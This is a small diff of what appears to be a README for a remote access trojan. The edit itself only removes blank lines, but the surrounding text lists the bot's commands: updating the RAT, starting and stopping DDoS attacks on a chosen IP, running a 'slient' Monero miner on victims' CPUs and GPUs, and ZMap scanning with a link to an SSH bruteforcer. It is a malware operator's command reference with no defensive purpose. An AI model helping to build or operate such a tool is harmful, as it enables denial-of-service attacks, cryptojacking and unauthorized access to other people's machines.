@@ -26,10 +26,8 @@ bnt: @udbnt
 * !sessions                              (List open sessions)
 * !check                                 (Check miner & ddos status)
 * !update                                (Update RAT)
-
 * !ddos < IP >                           (Start DDoS Attack)
 * !stopddos                              (Stop DDoS)
-
 * !miner < WALLET >                      (Start slient XMR Crypto Miner CPU + AMD/INTEL GPU's)
 * !stopminer                             (Stop miner)
 * !zmap                                  (ZMap subnet scan) (Bruteforce ip addresses: https://github.com/bntr00t/sshb)
